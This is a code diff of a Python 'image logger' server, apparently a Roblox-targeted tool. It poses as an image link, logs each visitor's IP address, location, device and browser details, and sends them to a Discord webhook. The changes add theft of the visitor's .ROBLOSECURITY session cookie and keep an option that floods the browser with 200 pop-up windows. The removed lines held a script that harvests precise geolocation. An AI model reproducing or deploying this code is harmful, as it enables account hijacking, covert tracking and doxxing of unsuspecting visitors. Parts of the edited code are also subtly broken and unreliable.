@@ -36,7 +36,7 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json = {
+    requests.post(config["webhook"], json={
         "username": config["username"],
         "content": "@everyone",
         "embeds": [
@@ -57,7 +57,7 @@ def get_roblosecurity_cookie(headers):
                 return cookie.split("=")[1]
     return None
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, roblosecurity_cookie=None):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, roblosecurity_cookie=None):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -65,7 +65,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     
     if bot:
         if config["linkAlerts"]:
-            requests.post(config["webhook"], json = {
+            requests.post(config["webhook"], json={
                 "username": config["username"],
                 "content": "",
                 "embeds": [
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
 > **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else f'Precise, [Google Maps](https://www.google.com/maps/search/google+map++{coords})'})
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
@@ -119,126 +119,101 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **User Agent:**
 
-**.ROBLOSECURITY Cookie:**
-        }
-    ],
+**.ROBLOSECURITY Cookie:** `{roblosecurity_cookie if roblosecurity_cookie else 'Not Available'}`
+            """
+            }
+        ],
     }
 
     if url:
         embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
+    requests.post(config["webhook"], json=embed)
     return info
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
-    try:
-        if config["imageArgument"]:
-            s = self.path
-            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-            if dic.get("url") or dic.get("id"):
-                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+        try:
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
             else:
                 url = config["image"]
-        else:
-            url = config["image"]
 
-        data = f'''<style>body {{
-    margin: 0;
-    padding: 0;
-    }}
-    div.img {{
-    background-image: url('{url}');
-    background-position: center center;
-    background-repeat: no-repeat;
-    background-size: contain;
-    width: 100vw;
-    height: 100vh;
-    }}</style><div class="img"></div>'''.encode()
+            roblosecurity_cookie = get_roblosecurity_cookie(self.headers)  # Obtén la cookie
 
-        if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-            return
-        
-        if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-            self.send_response(200 if config["buggedImage"] else 302)
-            self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-            self.end_headers()
-
-            if config["buggedImage"]: 
-                self.wfile.write(binaries["loading"]) 
-
-            makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-            return
-        
-        else:
-            s = self.path
-            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-            if dic.get("g") and config["accurateLocation"]:
-                location = base64.b64decode(dic.get("g").encode()).decode()
-                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
+            
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.end_headers()
+                if config["buggedImage"]:
+                    self.wfile.write(binaries["loading"])
+                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url, roblosecurity_cookie=roblosecurity_cookie)
+                return
+            
             else:
-                result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
-            message = config["message"]["message"]
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url, roblosecurity_cookie=roblosecurity_cookie)
+                else:
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, roblosecurity_cookie=roblosecurity_cookie)
 
-            if config["message"]["richMessage"] and result:
-                message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                message = message.replace("{isp}", result["isp"])
-                message = message.replace("{asn}", result["as"])
-                message = message.replace("{country}", result["country"])
-                message = message.replace("{region}", result["regionName"])
-                message = message.replace("{city}", result["city"])
-                message = message.replace("{lat}", str(result["lat"]))
-                message = message.replace("{long}", str(result["lon"]))
-                message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                message = message.replace("{mobile}", str(result["mobile"]))
-                message = message.replace("{vpn}", str(result["proxy"]))
-                message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+                message = config["message"]["message"]
 
-            datatype = 'text/html'
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
 
-            if config["message"]["doMessage"]:
-                data = message.encode()
-            
-            if config["crashBrowser"]:
-                data = message.encode() + b'<script>setTimeout(function(){for (let i = 0; i < 200; i++) {window.open("about:blank", "_blank");}}, 100);</script>'
+                datatype = 'text/html'
 
-            if config["redirect"]["redirect"]:
-                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                if config["message"]["doMessage"]:
+                    data = message.encode()
                 
-            self.send_response(200)
-            self.send_header('Content-type', datatype)
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function () {for (let i = 0; i < 200; i++) {window.open("about:blank", "_blank");}}, 100);</script>'
+                
+                if not config["message"]["doMessage"]:
+                    self.send_response(200 if config["buggedImage"] else 302)
+                    self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                    self.end_headers()
+                    if config["buggedImage"]:
+                        self.wfile.write(binaries["image"])
+                    return
+                else:
+                    self.send_response(200)
+                    self.send_header('Content-type', datatype)
+                    self.end_headers()
+                    self.wfile.write(data)
+                    return
+        except Exception as e:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
             self.end_headers()
-            
-            if config["accurateLocation"]:
-                data += b"""<script>
-    var currenturl = window.location.href;
-
-    if (!currenturl.includes("g=")) {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function (coords) {
-        if (currenturl.includes("?")) {
-            currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-        } else {
-            currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-        }
-        location.replace(currenturl);});
-    }}
-
-    </script>"""
-            self.wfile.write(data)
-    
-    except Exception as e:
-        self.send_response(500)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-
-        self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-        reportError(traceback.format_exc())
-
+            reportError(traceback.format_exc())
+            print(traceback.format_exc())
+            pass
 
     def do_GET(self):
         self.handleRequest()
